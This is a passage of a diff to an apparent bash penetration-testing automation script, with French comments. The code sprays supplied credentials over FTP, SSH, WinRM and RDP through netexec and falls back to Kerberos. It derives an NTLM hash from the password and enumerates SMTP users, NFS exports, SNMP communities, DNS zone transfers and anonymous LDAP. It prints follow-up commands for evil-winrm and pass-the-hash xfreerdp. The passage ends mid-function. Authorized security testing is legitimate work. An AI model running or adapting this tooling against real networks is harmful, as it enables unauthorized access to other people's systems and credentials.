-			$proxychains netexec ftp ${ip} -u "anonymous" -p "" < /dev/null >> $DIR_VULNS/ftp_anonymous_${ip}.txt 2>/dev/null 
-		
-			# Vérifier le code de retour de la commande SSH
-			if grep -aq '\[+\]' $DIR_VULNS/ftp_anonymous_${ip}.txt; then
-				green_log "${SPACE}${SPACE}[💀] FTP ANONYMOUS connection successed"
-				blue_log "${SPACE}${SPACE} [+] $proxychains ftp anonymous@$ip"
-			fi
+			if control_ip_attack; then
+				hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
+				# Essayer de se connecter à l'adresse IP via FTP
+				$proxychains netexec ftp ${ip} -u "anonymous" -p "" < /dev/null >> $DIR_VULNS/ftp_anonymous_${ip}.txt 2>/dev/null 
 			
-			if [[ "$Username" != "anonymous" ]];then
-				$proxychains netexec ftp ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ftp_${Username}_${ip}.txt 2>/dev/null 
 				# Vérifier le code de retour de la commande SSH
-				if grep -aq '\[+\]' $DIR_VULNS/ftp_${Username}_${ip}.txt; then
-					green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${username} user"
-					blue_log "${SPACE}${SPACE} [+] $proxychains ftp $Username@$ip"
+				if grep -aq '\[+\]' $DIR_VULNS/ftp_anonymous_${ip}.txt; then
+					green_log "${SPACE}${SPACE}[💀] FTP ANONYMOUS connection successed"
+					blue_log "${SPACE}${SPACE} [+] $proxychains ftp anonymous@$ip"
+					echo "$ip" >> $DIR_VULNS/machines_ftp_anonymous.txt
+					sort -u $DIR_VULNS/machines_ftp_anonymous.txt -o $DIR_VULNS/machines_ftp_anonymous.txt
+				fi
+				
+				if [[ "$Username" != "anonymous" ]];then
+					$proxychains netexec ftp ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ftp_${Username}_${ip}.txt 2>/dev/null 
+					# Vérifier le code de retour de la commande SSH
+					if grep -aq '\[+\]' $DIR_VULNS/ftp_${Username}_${ip}.txt; then
+						green_log "${SPACE}${SPACE}[💀] FTP connection successed with ${username} user"
+						blue_log "${SPACE}${SPACE} [+] $proxychains ftp $Username@$ip"
+					fi
 				fi
 			fi
 		done
@@ -517,19 +622,21 @@ ftp () {
 ssh () {
 	if [ -e "$DIR_PORTS/22.txt" ] && [ -n "$Username" ] && [ "$Username" != "anonymous" ] && [ -n "$Password" ]; then
 		# Lire le fichier 22.txt ligne par ligne
-		log "[🔍] Check SSH"
+		log "[🔍] Checking SSH"
 		SSH=$(cat $DIR_PORTS/22.txt)
 		for ip in $SSH; do
-			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			# Essayer de se connecter à l'adresse IP via SSH
-			#$proxychains sshpass -p "$Password" ssh -o StrictHostKeyChecking=no ${Username}@${ip} "ls" 2>/dev/null
-			
-			$proxychains netexec ssh ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ssh_${Username}_${ip}.txt 2>/dev/null 
-			# Vérifier le code de retour de la commande SSH
-			if grep -aq '\[+\]' $DIR_VULNS/ssh_${Username}_${ip}.txt; then
-				green_log "${SPACE}${SPACE}[💀] SSH connection successed"
-				blue_log "${SPACE}${SPACE} $proxychains ssh $Username@$ip"
+			if control_ip_attack; then
+				hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
+				# Essayer de se connecter à l'adresse IP via SSH
+				#$proxychains sshpass -p "$Password" ssh -o StrictHostKeyChecking=no ${Username}@${ip} "ls" 2>/dev/null
+				
+				$proxychains netexec ssh ${ip} -u $Username -p $Password < /dev/null >> $DIR_VULNS/ssh_${Username}_${ip}.txt 2>/dev/null 
+				# Vérifier le code de retour de la commande SSH
+				if grep -aq '\[+\]' $DIR_VULNS/ssh_${Username}_${ip}.txt; then
+					green_log "${SPACE}${SPACE}[💀] SSH connection successed"
+					blue_log "${SPACE}${SPACE} $proxychains ssh $Username@$ip"
+				fi
 			fi
 		done
 	fi
@@ -539,36 +646,38 @@ ssh () {
 winrm () {
 	# Vérifie si les fichier winrm existe
 	if { [ -e "$DIR_PORTS/5985.txt" ] || [ -e "$DIR_PORTS/5986.txt" ] || [ -e "$DIR_PORTS/47001.txt" ]; } && [ "$Username" != "anonymous" ]; then
-		log "[🔍] Check WINRM"
+		log "[🔍] Checking WINRM"
 		for fichier in $DIR_PORTS/5985.txt $DIR_PORTS/5986.txt $DIR_PORTS/47001.txt; do
 			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/winrm.txt"
 		done
 		sort -u ${DIR_PORTS}/winrm.txt -o ${DIR_PORTS}/winrm.txt
 		WINRM=$(cat $DIR_PORTS/winrm.txt)
 		for ip in $WINRM; do
-			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			# Essayer de se connecter à l'adresse IP via WINRM
-			$proxychains netexec --timeout $CME_TIMEOUT winrm ${ip} -u "$Username" $cme_creds < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
-			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/winrm_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/winrm_${ip}"; then
-				#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
-				kerberos="--kerberos"
-				host="${hostname}"
-				rm ${DIR_VULNS}/winrm_${ip}
-				$proxychains netexec --timeout $CME_TIMEOUT winrm $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
-			fi
-			
-			# Vérifier le code de retour de la commande WINRM
-			if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
-				green_log "${SPACE}${SPACE}[💀] WINRM connection successed"
-				if grep -aq '(Pwn3d!)' ${DIR_VULNS}/winrm_${ip}; then
-					red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
+			if control_ip_attack; then
+				hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
+				# Essayer de se connecter à l'adresse IP via WINRM
+				$proxychains netexec --timeout $CME_TIMEOUT winrm ${ip} -u "$Username" $cme_creds < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
+				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/winrm_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/winrm_${ip}"; then
+					#Si NTLM n'est pas supporté, recommencer en passant avec kerberos
+					kerberos="--kerberos"
+					host="${hostname}"
+					rm ${DIR_VULNS}/winrm_${ip}
+					$proxychains netexec --timeout $CME_TIMEOUT winrm $host -u "$Username" $cme_creds $kerberos < /dev/null > ${DIR_VULNS}/winrm_${ip} 2>/dev/null
 				fi
-				blue_log "${SPACE}${SPACE} [+] $proxychains evil-winrm -i ${ip} -u "$Username" $cme_creds"
-			else
-				#echo ${DIR_VULNS}/winrm_${ip}
-				#cat ${DIR_VULNS}/winrm_${ip}
-				rm ${DIR_VULNS}/winrm_${ip}
+				
+				# Vérifier le code de retour de la commande WINRM
+				if [ "$(cat ${DIR_VULNS}/winrm_${ip} | grep -ai '\[+\]')" ]; then
+					green_log "${SPACE}${SPACE}[💀] WINRM connection successed"
+					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/winrm_${ip}; then
+						red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
+					fi
+					blue_log "${SPACE}${SPACE} [+] $proxychains evil-winrm -i ${ip} -u "$Username" $cme_creds"
+				else
+					#echo ${DIR_VULNS}/winrm_${ip}
+					#cat ${DIR_VULNS}/winrm_${ip}
+					rm ${DIR_VULNS}/winrm_${ip}
+				fi
 			fi
 		done
 	fi
@@ -586,60 +695,62 @@ rdp () {
 		log "[🔍] Checking RDP"
 		RDP=$(cat $DIR_PORTS/3389.txt)
 		for ip in $RDP; do
-			hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-			rdp_mode="NTLM"
-			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			if [[ "$Username" != "anonymous" ]]; then
-				$proxychains netexec --timeout $CME_TIMEOUT rdp $ip -u $Username $cme_creds --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
-				successed_rdp="${SPACE}${SPACE}[💀] RDP connection successed (via NTLM) -> Can be only available in restricted admin mode or with password"
-				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/rdp_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/rdp_${ip}"; then
-					#If NTLM is not supported, restart with kerberos
-					rdp_mode="KRB"
-					if [[ -n "$hostname" ]];then
-						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
-						host="$(echo $hostname | cut -d '.' -f 1)"
-					fi
-					if [[ -n "$Password" ]];then
-						NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
-						#First try with NTLM_Hash
-						$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" -H "$NTLM" $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
-						check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
-						if [[ "$check_rdp" -gt 0 ]]; then
-							successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+			if control_ip_attack; then
+				hostname=$(grep -aE "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+				rdp_mode="NTLM"
+				log "${SPACE}[📂] Checking $ip ($hostname) ..."
+				if [[ "$Username" != "anonymous" ]]; then
+					$proxychains netexec --timeout $CME_TIMEOUT rdp $ip -u $Username $cme_creds --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+					successed_rdp="${SPACE}${SPACE}[💀] RDP connection successed (via NTLM) -> Can be only available in restricted admin mode or with password"
+					if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/rdp_${ip}" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/rdp_${ip}"; then
+						#If NTLM is not supported, restart with kerberos
+						rdp_mode="KRB"
+						if [[ -n "$hostname" ]];then
+							kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
+							host="$(echo $hostname | cut -d '.' -f 1)"
+						fi
+						if [[ -n "$Password" ]];then
+							NTLM=$(iconv -f ASCII -t UTF-16LE <(printf "${Password}") | openssl dgst -md4 | awk -F "= " '{print $2}')
+							#First try with NTLM_Hash
+							$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" -H "$NTLM" $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+							if [[ "$check_rdp" -gt 0 ]]; then
+								successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+							else
+								#Second try with Password
+								$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
+								check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+								if [[ "$check_rdp" -gt 0 ]]; then
+									#Can be detected by disconnection
+									successed_rdp="${SPACE}${SPACE}[💀] KRB NON OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+								fi
+							fi
 						else
-							#Second try with Password
+							#Can be detected by disconnection
+							echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
 							$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
 							check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
 							if [[ "$check_rdp" -gt 0 ]]; then
-								#Can be detected by disconnection
-								successed_rdp="${SPACE}${SPACE}[💀] KRB NON OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
+								successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
 							fi
-						fi
-					else
-						#Can be detected by disconnection
-						echo "$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot"
-						$proxychains timeout $CME_TIMEOUT netexec rdp $host -u "$Username" $cme_creds $kerberos --screenshot < /dev/null > ${DIR_VULNS}/rdp_${ip} 2>/dev/null
-						check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
-						if [[ "$check_rdp" -gt 0 ]]; then
-							successed_rdp="${SPACE}${SPACE}[💀] KRB OPSEC - RDP connection successed (via Kerberos only) -> Can be only available in restricted admin mode or with password"
 						fi
 					fi
 				fi
-			fi
-				
-			if grep -aq '\[+\]' ${DIR_VULNS}/rdp_${ip}; then
-				if grep -aq '(Pwn3d!)' ${DIR_VULNS}/rdp_${ip}; then
-					red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
-					admin="1"
-				fi
-				check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
-				if [[ "$check_rdp" -gt 0 ]]; then
-					green_log "$successed_rdp"
-					if [ "$rdp_mode" = "NTLM" ]; then
-						if [ -n "$NT_Hash" ]; then
-							blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
-						else
-							blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
+					
+				if grep -aq '\[+\]' ${DIR_VULNS}/rdp_${ip}; then
+					if grep -aq '(Pwn3d!)' ${DIR_VULNS}/rdp_${ip}; then
+						red_log "${SPACE}${SPACE}[💀] $Username have admin rights !"
+						admin="1"
+					fi
+					check_rdp=$(grep -o 'Screenshot saved' ${DIR_VULNS}/rdp_${ip} | wc -l)
+					if [[ "$check_rdp" -gt 0 ]]; then
+						green_log "$successed_rdp"
+						if [ "$rdp_mode" = "NTLM" ]; then
+							if [ -n "$NT_Hash" ]; then
+								blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /pth:${NT_Hash} /sec:nla +clipboard"
+							else
+								blue_log "${SPACE}${SPACE} [+] $proxychains xfreerdp /cert-tofu /v:${ip} /u:${Username} /p:${Password} /sec:nla +clipboard"
+							fi
 						fi
 					fi
 				fi
@@ -652,15 +763,24 @@ rdp () {
 smtp () {
 	# 25
 	if [ -e "$DIR_PORTS/25.txt" ]; then
-		log "[🔍] Check SMTP"
+		log "[🔍] Checking SMTP"
 		SMTP=$(cat $DIR_PORTS/25.txt)
 		for ip in $SMTP; do
-			$proxychains smtp-user-enum -M VRFY -U /root/pentest_priv/Usernames.txt -t ${ip} < /dev/null >> $DIR_VULNS/smtp_${ip}.txt 2>/dev/null
-			grep "exists" $DIR_VULNS/smtp_${ip}.txt | awk '{print $2}' > $DIR_VULNS/user_smtp_${ip}.txt
-			green_log "${SPACE}[💀] ${cat $DIR_VULNS/user_smtp_${ip}.txt | wc -l} users found $ip via SMTP -> $DIR_VULNS/user_smtp_${ip}.txt"
-			sort -u $DIR_VULNS/user_smtp_${ip}.txt -o $DIR_VULNS/user_smtp_${ip}.txt
-			cat $DIR_VULNS/user_smtp_${ip}.txt >> ${DIR}/users.txt
-			sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+			if control_ip_attack; then
+				mode=("VRFY" "RCPT" "EXPN")
+				for mode_key in $mode; do
+					$proxychains smtp-user-enum -M VRFY -U "/root/pentest_priv/Usernames.txt" -t ${ip} < /dev/null > $DIR_VULNS/smtp_${ip}.txt 2>/dev/null
+					nb_users_smtp=$(grep "exists" "$DIR_VULNS/smtp_${ip}.txt" | wc -l 2>/dev/null)
+					nb_users_smtp_max=$(wc -l < "/root/pentest_priv/Usernames.txt" 2>/dev/null)
+					if [[ "$nb_users_smtp" -ne "$nb_users_smtp_max" ]] && [[ "$nb_users_smtp" -ne 0 ]]; then
+						green_log "${SPACE}[💀] $nb_users_smtp users found $ip via SMTP (mode $mode_key) -> $DIR_VULNS/user_smtp_${ip}.txt"
+						grep "exists" $DIR_VULNS/smtp_${ip}.txt | awk '{print $2}' > $DIR_VULNS/user_smtp_${ip}.txt
+						sort -u $DIR_VULNS/user_smtp_${ip}.txt -o $DIR_VULNS/user_smtp_${ip}.txt
+						cat $DIR_VULNS/user_smtp_${ip}.txt >> ${DIR}/users.txt
+						sort -u ${DIR}/users.txt -o ${DIR}/users.txt
+					fi
+				done
+			fi
 		done		
 	fi
 }
@@ -669,13 +789,15 @@ smtp () {
 nfs () {
 	# Vérifie si le fichier 2049.txt existe
 	if [ -e "$DIR_PORTS/2049.txt" ]; then
-		log "[🔍] Check NFS"
+		log "[🔍] Checking NFS"
 		NFS=$(cat $DIR_PORTS/2049.txt)
 		for ip in $NFS; do
-			$proxychains showmount -e $ip < /dev/null > $DIR_VULNS/tmp_nfs.txt 2>/dev/null
-			if [ "$(wc -l < $DIR_VULNS/tmp_nfs.txt)" -gt 1 ]; then
-				green_log "${SPACE}[💀] NFS vulnerability detected on $ip"
-				blue_log "showmount -e ${ip}"
+			if control_ip_attack; then	
+				$proxychains showmount -e $ip < /dev/null > $DIR_VULNS/tmp_nfs.txt 2>/dev/null
+				if [ "$(wc -l < $DIR_VULNS/tmp_nfs.txt)" -gt 1 ]; then
+					green_log "${SPACE}[💀] NFS vulnerability detected on $ip"
+					blue_log "${SPACE}${SPACE} [+] showmount -e ${ip}"
+				fi
 			fi
 		done
 	fi
@@ -685,7 +807,7 @@ nfs () {
 vnc () {
 	# 5800,5801,5900,5901
 	if [[ -e "$DIR_PORTS/5800.txt" ]] || [[ -e "$DIR_PORTS/5801.txt" ]] || [[ -e "$DIR_PORTS/5900.txt" ]] || [[ -e "$DIR_PORTS/5901.txt" ]]; then
-		log "[🔍] Check NFS"
+		log "[🔍] Checking NFS"
 		for fichier in $DIR_PORTS/5800.txt $DIR_PORTS/5801.txt $DIR_PORTS/5900.txt $DIR_PORTS/5901.txt; do
 			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/vnc.txt"
 		done
@@ -712,7 +834,6 @@ zt () {
 	do
 		$proxychains host -T -t axfr $domain $name_server > $DNSPATH/$name_server.txt 2>/dev/null
 		if [[ -s "$DNSPATH/$name_server.txt" && $(grep -qE "; Transfer failed.|timed out" "$DNSPATH/$name_server.txt"; echo $?) -ne 0 ]]; then
-			
 			green_log "${SPACE}[💀] Zone transfer performed successfully for $name_server ! -> $DNSPATH/$name_server.txt"
 			blue_log "${SPACE} [+] $proxychains host -T -t axfr $domain $name_server"
 		fi
@@ -722,47 +843,87 @@ zt () {
 # ########################### Printer Recon ###############################
 printers () {
 	log "[🔍] Printer Scan using SNMP Protocol Started"
-	#pret is a python script that discover printers via snmp broadcast
-	if [ "$rangeIP" == "$NETWORK_LAN" ];then
-		python2 pret.py >> $DIR/PrinterScan.txt 2>>/dev/null
-		if grep -qi "Device" $DIR/PrinterScan.txt ;then
-			green_log "${SPACE}[!] Printers found ! Please combine these findings with the nmap web interface scan for printers -> $DIR/PrinterScan.txt"
+	
+	#pret is a python script that discover printers via snmp broadcast, so we have to determine if a network in on a target
+	
+	MY_IP=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -d'/' -f1)
+	MY_IP_WITH_MASK=$(ip -o -4 addr show $INTERFACE | awk '{print $4}' | cut -f1)
+	# Calculer l'adresse réseau pour arp discovery
+	NETWORK_LAN=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Address:" | awk '{print $2}')
+	NETWORK_LAN_BROADCAST=$(ipcalc -n -b $MY_IP_WITH_MASK | grep "Broadcast:" | awk '{print $2}')
+	
+	rangeIP_array=$(echo "$rangeIP" | tr ',' '\n')
+	for rangeIP_array_key in $rangeIP_array; do
+		if echo $rangeIP_array_key | grep -vq "/32"; then
+			TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Network:" | awk '{print $2}')
+			TARGET_LAN_BROADCAST=$(ipcalc -n -b $rangeIP_array_key | grep "Broadcast:" | awk '{print $2}')
 		else
-			#red_log "${SPACE}[!] No printers using SNMP were found !"
-			rm .Printer_enum.txt
+			TARGET_LAN=$(ipcalc -n -b $rangeIP_array_key  | grep "Address:" | awk '{print $2}')
+			TARGET_LAN_BROADCAST=$TARGET_LAN
 		fi
-	else
-		log "${SPACE}[!] You can try to execute this search with -> python2 pret.py $domain"
-	fi
+
+		# Convert IP addresses to integers for comparison
+		ip_to_int() {
+			local a b c d
+			IFS=. read -r a b c d <<< "$1"
+			echo $((a * 256**3 + b * 256**2 + c * 256 + d))
+		}
+		network_start=$(ip_to_int "$NETWORK_LAN")
+		network_end=$(ip_to_int "$NETWORK_LAN_BROADCAST")
+		target_start=$(ip_to_int "$TARGET_LAN")
+		target_end=$(ip_to_int "$TARGET_LAN_BROADCAST")
+
+		#If attack range is into the selected network interface
+		if [[ $network_start -le $target_start && $network_end -ge $target_end ]]; then
+			if which pret.py > /dev/null 2>&1; then
+				python2 pret.py >> $DIR/PrinterScan.txt 2>>/dev/null
+				if grep -qi "Device" $DIR/PrinterScan.txt ;then
+					green_log "${SPACE}[!] Printers found ! Please combine these findings with the nmap web interface scan for printers -> $DIR/PrinterScan.txt"
+				fi
+			else
+				log "${SPACE}[!] Impossible to find pret.py"
+			fi
+		fi
+	done
 }
 
 # ########################### SNMP ###############################
 snmp () {
 	if [[ -e "$DIR_PORTS/161.txt" ]] || [[ -e "$DIR_PORTS/162.txt" ]] || [[ -e "$DIR_PORTS/1061.txt" ]] || [[ -e "$DIR_PORTS/1062.txt" ]]; then
-		log "[??] Check devices using SNMP protocol on public community"
-		#merge of files
-		for fichier in $DIR_PORTS/161.txt $DIR_PORTS/162.txt $DIR_PORTS/1061.txt $DIR_PORTS/1062.txt; do
-			cat "$fichier" 2>/dev/null >> "$DIR_PORTS/snmp.txt"
-		done
-  		sort -u "$DIR_PORTS/snmp.txt" -o "$DIR_PORTS/snmp.txt"
-  
-		onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -i "$DIR_PORTS/snmp.txt" -o "$DIR/communities.txt" -w 100 -q
-  
-		for ip in ${DIR_PORTS}/snmp.txt; do
-    			while read -r line; do
-    				ip=$(echo "$line" | awk '{print $1}')
-				hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
-    				COMMUNITY=$(echo "$line" | awk -F'[][]' '{print $2}')
-				green_log "${SPACE}[💀] SNMP v1 in ${COMMUNITY} community found on $ip ($hostname) : $DIR/communities.txt"
-			done < $DIR/communities.txt
+		log "[🔍] Checking SNMP communities"
+		if [ -z "$proxychains" ]; then
+			#merge of files
+			for fichier in $DIR_PORTS/161.txt $DIR_PORTS/162.txt $DIR_PORTS/1061.txt $DIR_PORTS/1062.txt; do
+				cat "$fichier" 2>/dev/null >> "$DIR_PORTS/snmp.txt"
+			done
+			sort -u "$DIR_PORTS/snmp.txt" -o "$DIR_PORTS/snmp.txt"
+	  
+			onesixtyone -c "/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt" -i "$DIR_PORTS/snmp.txt" -o "$DIR/communities.txt" -w 100 -q
+			sort -u "$DIR/communities.txt" -o "$DIR/communities.txt"
+			for ip in $(cat ${DIR_PORTS}/snmp.txt); do
+				echo $ip
+				if control_ip_attack; then
+					echo $ip
+					if grep -q "$ip" "$DIR/communities.txt"; then
+						hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
+						COMMUNITY=$(grep "$ip" "$DIR/communities.txt" | awk -F'[][]' '{print $2}')
+						for COMMUNITY_KEY in $COMMUNITY; do
+							green_log "${SPACE}[💀] SNMP v1 in ${COMMUNITY_KEY} community found on $ip ($hostname) : $DIR/communities.txt"
+						done
+					fi
 
-			result_v2c=""
-			result_v2c=$(snmpwalk -v 2c -c public $ip -t $SNMP_TIMEOUT)
-			if [[ -n "$result_v2c" ]]; then
-				green_log "${SPACE}[💀] SNMP v2c in PUBLIC community found on $ip ($hostname) : ${DIR_VULNS}/SNMP-Public_v2c.txt"
-				echo "$result_v2c" >> ${DIR_VULNS}/SNMP-Public_v2c.txt
-			fi
-		done
+					result_v2c=""
+					result_v2c=$(timeout $SNMP_TIMEOUT snmpwalk -v 2c -c public $ip )
+					echo "timeout $SNMP_TIMEOUT snmpwalk -v 2c -c public $ip"
+					if [[ -n "$result_v2c" ]]; then
+						green_log "${SPACE}[💀] SNMP v2c in PUBLIC community found on $ip ($hostname) : ${DIR_VULNS}/SNMP-Public_v2c.txt"
+						echo "$result_v2c" >> "${DIR_VULNS}/SNMP-Public_v2c.txt"
+					fi
+				fi
+			done
+		else
+			log "${SPACE}${SPACE} [!]] Unable to perfom SMNP communities check with proxychains (only support TCP packets)"
+		fi	
 	fi
 }
 
@@ -771,53 +932,58 @@ ldap () {
 	### ANONYMOUS LDAP ###
 	if [[ -e "${DIR_PORTS}/389.txt" ]]; then
 		mkdir ${DIR_VULNS}/ldap
-		log "[🔍] Anonymous LDAP check"
+		log "[🔍] Checking anonymous LDAP"
 		#Extract the IPs of machines with port 389 open
-		ip=$(cat "${DIR_PORTS}/389.txt" 2>/dev/null)
+		ip_389=$(cat "${DIR_PORTS}/389.txt" 2>/dev/null)
 		#extraction of the FQDN and IP names of machines with port 389 open
-		grep -E $ip ${DIR}/hostname_file.txt > ${DIR}/IP_FQDN_ldap.txt
+		for ip_389_key in $ip_389; do
+			grep $ip_389_key ${DIR}/hostname_file.txt >> ${DIR}/IP_FQDN_ldap.txt
+		done
+		sort -u ${DIR}/IP_FQDN_ldap.txt -o ${DIR}/IP_FQDN_ldap.txt
 		#Extraction of one line (ip + hostname) from the LDAP server (AD) for each domain/sub-domain. The aim is not to carry out the attack on 3 DCs in the same domain
-		awk -F ':' '{ split($2, parts, "."); domain = parts[2] "." parts[3] "." parts[4] "." parts[5]  "." parts[6]; if (!seen[domain]++) print $0;}' ${DIR}/IP_FQDN_ldap.txt > ${DIR}/IP_FQDN_ldap_filtered.txt
+		awk -F ':' '{ split($2, parts, "."); domain = parts[2] "." parts[3] "." parts[4] "." parts[5]  "." parts[6]; if (!seen[domain]++) print $0;}' ${DIR}/IP_FQDN_ldap.txt >> ${DIR}/IP_FQDN_ldap_filtered.txt
+		cat ${DIR}/IP_FQDN_ldap_filtered.txt
 		LDAP_ip=$(cat ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f1)
 		LDAP_domain_old=()
 		for ip in $LDAP_ip; do
-			#Récupération du nom de domaine associé à l'IP
-			LDAP_domain=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2- |cut -d'.' -f2-)
-			
-			#If domain didn't pass yet
-			if [[ ! " ${LDAP_domain_old[@]} " =~ " ${LDAP_domain} " ]]; then
-				log "${SPACE}[📂] Check for domain ${LDAP_domain} ($ip) ..."
-				#Création de la base pour la requete ldapsearch
-				base_ldap="DC=$(echo "$LDAP_domain" | sed 's/\./,DC=/g')"
-				DC_Name=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2-)
-				#Adding $LDAP_domain in the LDAP_domain_old LDAP_domain_old
-				LDAP_domain_old+=("$LDAP_domain")
-				
-				#Extraction des utilisateurs et groupes (CN) : Peu précis ..
-				$proxychains ldapsearch -H ldap://${ip} -x -w '' -D '' -b "${base_ldap}" | grep 'dn: CN=' > ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt 2>/dev/null
-				check_ldap=$(cat ${DIR_VULNS}/ldap/ldap_anonymous_users_${ip}_${domain}.txt | wc -l)
-				
-				if [[ "$check_ldap" -gt 0 ]]; then
-					green_log "${SPACE}${SPACE}[💀] Anonymous LDAP possible -> ${DIR_VULNS}/ldap/ldap_anonymous_${ip}_${domain}.txt"
+			if control_ip_attack; then
+				#Récupération du nom de domaine associé à l'IP
+				LDAP_domain=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2- |cut -d'.' -f2-)				
+				#If domain didn't pass yet
+				if [[ ! " ${LDAP_domain_old[@]} " =~ " ${LDAP_domain} " ]]; then
+					log "${SPACE}[📂] Checking domain ${LDAP_domain} ($ip) ..."
+					#Création de la base pour la requete ldapsearch
+					base_ldap="DC=$(echo "$LDAP_domain" | sed 's/\./,DC=/g')"
+					DC_Name=$(grep -E ${ip} ${DIR}/IP_FQDN_ldap_filtered.txt | cut -d':' -f2-)
+					#Adding $LDAP_domain in the LDAP_domain_old LDAP_domain_old
+					LDAP_domain_old+=("$LDAP_domain")
 					
-					#Aller plus loin en tentant d'extraire les noms d'utilisateurs :
